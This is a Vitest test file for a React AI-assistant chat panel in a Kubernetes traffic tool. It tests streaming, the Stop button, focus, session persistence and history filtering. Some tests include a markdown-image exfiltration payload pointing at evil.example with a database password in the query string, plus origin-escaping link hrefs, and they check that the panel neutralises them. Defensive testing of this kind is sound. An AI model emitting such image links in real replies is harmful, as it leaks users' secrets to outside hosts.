// @vitest-environment jsdom
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import { act, cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';
import AIAssistant from './AIAssistant';
import { streamChatMessage, type StreamHandlers, type StreamOptions } from '../services/aiApi';

vi.mock('../services/aiApi', async (actual) => ({ ...(await actual<typeof import('../services/aiApi')>()), streamChatMessage: vi.fn() }));

interface Stream {
  handlers: StreamHandlers;
  signal: AbortSignal | undefined;
  /** Ends the stream the way the bridge's final frame does. */
  finish: () => void;
}

// A reply that stays in flight until the test ends it or Stop aborts it.
function pendingStream(): Promise<Stream> {
  return new Promise<Stream>((started) => {
    vi.mocked(streamChatMessage).mockImplementation(
      (_message, _history, _context, handlers: StreamHandlers, opts: StreamOptions = {}) =>
        new Promise<void>((finish) => {
          opts.signal?.addEventListener('abort', () => finish());
          started({ handlers, signal: opts.signal, finish });
        }),
    );
  });
}

const CONVERSATION_KEY = 'kguardian.ai-assistant.conversation';
const QUESTION = 'Which namespaces have the most workloads?';

beforeEach(() => {
  localStorage.clear();
  sessionStorage.clear();
  localStorage.setItem('kguardian.ai-assistant.view-mode', 'side-panel');
  Element.prototype.scrollIntoView = vi.fn();
});
afterEach(() => {
  cleanup();
  vi.useRealTimers();
  vi.mocked(streamChatMessage).mockReset();
});

function send(text: string): HTMLElement {
  fireEvent.change(screen.getByPlaceholderText(/Ask about traffic/), { target: { value: text } });
  const button = screen.getByRole('button', { name: 'Send message' });
  fireEvent.click(button);
  return button;
}

const storedMessages = (n: number, pad = '') =>
  Array.from({ length: n }, (_, i) => ({
    id: `m-${i}`,
    role: i % 2 ? 'assistant' : 'user',
    content: `message ${i}${pad}`,
    timestamp: '2026-09-28T10:00:00.000Z',
  }));

it('offers Stop while a reply is in flight; Stop aborts the stream and the bubble says so', async () => {
  const started = pendingStream();
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  const sendButton = send(QUESTION);
  const stream = await started;
  expect(screen.getByText('Thinking…')).toBeTruthy();
  expect(screen.queryByRole('button', { name: 'Send message' })).toBeNull();
  // The same element reads Stop, so focus left on Send is not dropped.
  const stop = screen.getByRole('button', { name: 'Stop generating' });
  expect(stop).toBe(sendButton);

  stop.focus();
  fireEvent.click(stop);
  expect(stream.signal?.aborted).toBe(true);
  expect(document.activeElement).toBe(screen.getByPlaceholderText(/Ask about traffic/));
  await waitFor(() => expect(screen.getByRole('button', { name: 'Send message' })).toBe(stop));
  expect(screen.queryByText('Thinking…')).toBeNull();
  expect(screen.getByText('Stopped before an answer arrived.')).toBeTruthy();
});

it('says how long a reply has been coming once it passes 5 s, until text arrives', async () => {
  vi.useFakeTimers({ shouldAdvanceTime: true });
  const started = pendingStream();
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  send(QUESTION);
  const stream = await started;
  expect(screen.queryByText(/still working/)).toBeNull();

  await act(async () => {
    vi.advanceTimersByTime(6000);
  });
  expect(screen.getByText(/still working, 6s/)).toBeTruthy();

  act(() => stream.handlers.onText?.('argocd has the most.'));
  expect(screen.queryByText(/still working/)).toBeNull();
  act(() => {
    stream.handlers.onDone?.({ model: 'm' });
    stream.finish();
  });
  await waitFor(() => expect(screen.getByRole('button', { name: 'Send message' })).toBeTruthy());
});

it('docked, the panel is a complementary landmark named AI Assistant and Escape inside it closes it', () => {
  const onClose = vi.fn();
  render(<AIAssistant isOpen onClose={onClose} namespace="argocd" podNames={[]} />);
  const panel = screen.getByRole('complementary', { name: 'AI Assistant' });
  const textarea = screen.getByPlaceholderText(/Ask about traffic/);
  expect(panel.contains(textarea)).toBe(true);
  fireEvent.keyDown(textarea, { key: 'Escape' });
  expect(onClose).toHaveBeenCalledTimes(1);

  fireEvent.click(screen.getByRole('button', { name: 'Collapse panel' }));
  const bar = screen.getByRole('complementary', { name: 'AI Assistant' });
  fireEvent.keyDown(screen.getByRole('button', { name: 'Expand AI Assistant' }), { key: 'Escape' });
  expect(bar).toBeTruthy();
  expect(onClose).toHaveBeenCalledTimes(2);
});

it('keeps the conversation for the session: reopening shows it, Clear forgets it', async () => {
  const started = pendingStream();
  const first = render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  send(QUESTION);
  const stream = await started;
  act(() => {
    stream.handlers.onText?.('argocd has the most.');
    stream.handlers.onDone?.({ model: 'm' });
    stream.finish();
  });
  await waitFor(() => expect(screen.getByRole('button', { name: 'Send message' })).toBeTruthy());

  // The app unmounts the panel on close.
  first.unmount();
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  expect(screen.getByText(QUESTION)).toBeTruthy();
  expect(screen.getByText('argocd has the most.')).toBeTruthy();

  fireEvent.click(screen.getByRole('button', { name: 'Clear' }));
  expect(screen.getByText('Ask about your cluster')).toBeTruthy();
  expect(sessionStorage.getItem(CONVERSATION_KEY)).toBeNull();
});

it('starts empty when the stored conversation cannot be read', () => {
  sessionStorage.setItem(CONVERSATION_KEY, '{not json');
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  expect(screen.getByText('Ask about your cluster')).toBeTruthy();
  sessionStorage.setItem(CONVERSATION_KEY, JSON.stringify([{ id: 1, role: 'system', content: 'x' }]));
  cleanup();
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  expect(screen.getByText('Ask about your cluster')).toBeTruthy();
  sessionStorage.setItem(CONVERSATION_KEY, JSON.stringify([{ id: 'a', role: 'user', content: 'x', timestamp: 'not a date' }]));
  cleanup();
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  expect(screen.getByText('Ask about your cluster')).toBeTruthy();
});

it('keeps the last 50 messages of a long conversation, on screen and in storage', () => {
  sessionStorage.setItem(CONVERSATION_KEY, JSON.stringify(storedMessages(60)));
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  expect(screen.queryByText('message 9')).toBeNull();
  expect(screen.getByText('message 10')).toBeTruthy();
  expect(screen.getByText('message 59')).toBeTruthy();
  const kept = JSON.parse(sessionStorage.getItem(CONVERSATION_KEY)!) as { id: string }[];
  expect(kept.length).toBe(50);
  expect(kept[0].id).toBe('m-10');
});

it('drops the oldest turns when the browser refuses the write for size, so what is stored is what is newest', () => {
  sessionStorage.setItem(CONVERSATION_KEY, JSON.stringify(storedMessages(16, ' ' + 'x'.repeat(200))));
  const setItem = Storage.prototype.setItem;
  const spy = vi.spyOn(Storage.prototype, 'setItem').mockImplementation(function (this: Storage, key: string, value: string) {
    if (value.length > 1500) throw new DOMException('quota', 'QuotaExceededError');
    setItem.call(this, key, value);
  });
  try {
    render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
    const kept = JSON.parse(sessionStorage.getItem(CONVERSATION_KEY)!) as { id: string }[];
    expect(kept.length).toBeGreaterThan(0);
    expect(kept.length).toBeLessThan(16);
    expect(kept.at(-1)?.id).toBe('m-15');
  } finally {
    spy.mockRestore();
  }
});

it('a reply that finishes while the Stop button holds focus hands focus to the textarea, not to a disabled Send', async () => {
  const started = pendingStream();
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  send(QUESTION);
  const stream = await started;
  const stop = screen.getByRole('button', { name: 'Stop generating' });
  stop.focus();
  expect(document.activeElement).toBe(stop);

  act(() => {
    stream.handlers.onText?.('argocd has the most.');
    stream.handlers.onDone?.({ model: 'm' });
    stream.finish();
  });
  await waitFor(() => expect(screen.getByRole('button', { name: 'Send message' })).toBe(stop));
  expect((stop as HTMLButtonElement).disabled).toBe(true);
  expect(document.activeElement).toBe(screen.getByPlaceholderText(/Ask about traffic/));
});

function replyWith(text: string) {
  vi.mocked(streamChatMessage).mockImplementation(async (_m, _h, _c, handlers: StreamHandlers) => {
    handlers.onText?.(text);
    handlers.onDone?.({ model: 'm' });
  });
}

const at = '2026-09-28T10:00:00.000Z';

it('never loads an image named by the model: it shows the alt text, not an <img>', async () => {
  replyWith('Summary ![exfil](https://evil.example/p.png?d=payments-db-password) done');
  const { container } = render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  send(QUESTION);
  await waitFor(() => expect(screen.getByText(/Summary/)).toBeTruthy());
  expect(container.querySelector('img')).toBeNull();
  expect(container.innerHTML).not.toContain('evil.example');
  expect(screen.getByText(/exfil/)).toBeTruthy();
});

it('an image with no alt text still says one was left out', async () => {
  replyWith('Before ![](https://evil.example/p.png) after');
  const { container } = render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  send(QUESTION);
  await waitFor(() => expect(screen.getByText('[image]')).toBeTruthy());
  expect(container.querySelector('img')).toBeNull();
});

it('opens external links from a reply in a new tab without a referrer or opener', async () => {
  replyWith('See [the docs](https://kubernetes.io/docs/concepts/services-networking/network-policies/).');
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  send(QUESTION);
  const link = await screen.findByRole('link', { name: 'the docs' });
  expect(link.getAttribute('target')).toBe('_blank');
  expect(link.getAttribute('rel')).toBe('noopener noreferrer');
});

// A browser resolves each of these to another origin although none starts
// with `//` or `scheme://`. (The Markdown parser percent-encodes backslashes,
// so those two stay on this origin; they are here so any link that does
// leave it is caught.)
it.each(['https:evil.example/x', 'HTTP:evil.example/x', '/\\evil.example/x', '\\\\\\\\evil.example/x'])('a reply link to %s that leaves this origin opens in a new tab', async (href) => {
  replyWith(`See [the page](${href}).`);
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  send(QUESTION);
  const link = await screen.findByRole('link', { name: 'the page' });
  if (new URL(link.getAttribute('href')!, location.href).origin === location.origin) return;
  expect(link.getAttribute('target')).toBe('_blank');
  expect(link.getAttribute('rel')).toBe('noopener noreferrer');
});

it('keeps a same-origin reply link in this tab', async () => {
  replyWith('Open [the map](#/map?ns=argocd).');
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  send(QUESTION);
  const link = await screen.findByRole('link', { name: 'the map' });
  expect(link.getAttribute('target')).toBeNull();
});

it("clips the context to llm-bridge's 2,000 characters, so long pod names never make every message fail", async () => {
  replyWith('ok');
  // Kubernetes allows 253-character pod names; 20 of them are about 5,000 characters.
  const podNames = Array.from({ length: 20 }, (_, i) => `${'a'.repeat(240)}-${i}`);
  render(<AIAssistant isOpen onClose={() => {}} namespace="payments" podNames={podNames} />);
  send(QUESTION);
  await waitFor(() => expect(streamChatMessage).toHaveBeenCalled());
  const context = vi.mocked(streamChatMessage).mock.calls[0][2]!;
  expect(context.length).toBeLessThanOrEqual(2000);
  const parsed = JSON.parse(context);
  expect(parsed.namespace).toBe('payments');
  // As many whole names as fit, in order.
  expect(parsed.podNames.length).toBeGreaterThan(0);
  expect(parsed.podNames).toEqual(podNames.slice(0, parsed.podNames.length));
});

it('sends only completed exchanges as history: failed, stopped and empty replies are left out', async () => {
  const turn = (id: string, role: 'user' | 'assistant', content: string) => ({ id, role, content, timestamp: at });
  sessionStorage.setItem(CONVERSATION_KEY, JSON.stringify([
    turn('a', 'user', 'q1'),
    turn('b', 'assistant', 'Error: 503 Service Unavailable'),
    turn('c', 'user', 'q2'),
    turn('d', 'assistant', '_Stopped before an answer arrived._'),
    turn('e', 'user', 'q3'),
    turn('f', 'assistant', 'a3 partial\n\n_Stopped._'),
    turn('g', 'user', 'q4'),
    turn('h', 'assistant', 'a4 partial\n\n_Error: The reply was cut off before it finished_'),
    turn('i', 'user', 'q5'),
    turn('j', 'assistant', 'a5'),
  ]));
  replyWith('ok');
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  send(QUESTION);
  await waitFor(() => expect(screen.getByRole('button', { name: 'Send message' })).toBeTruthy());
  expect(vi.mocked(streamChatMessage).mock.calls[0][1]).toEqual([
    { role: 'user', content: 'q3' },
    { role: 'assistant', content: 'a3 partial' },
    { role: 'user', content: 'q4' },
    { role: 'assistant', content: 'a4 partial' },
    { role: 'user', content: 'q5' },
    { role: 'assistant', content: 'a5' },
  ]);
});

it('a reply that finishes empty is not sent back as history', async () => {
  vi.mocked(streamChatMessage).mockImplementation(async (_m, _h, _c, handlers: StreamHandlers) => {
    handlers.onDone?.({ model: 'm' });
  });
  render(<AIAssistant isOpen onClose={() => {}} namespace="argocd" podNames={[]} />);
  send('first');
  await waitFor(() => expect(screen.getByRole('button', { name: 'Send message' })).toBeTruthy());
  send('second');
  await waitFor(() => expect(vi.mocked(streamChatMessage).mock.calls).toHaveLength(2));
  expect(vi.mocked(streamChatMessage).mock.calls[1][1]).toEqual([]);
});
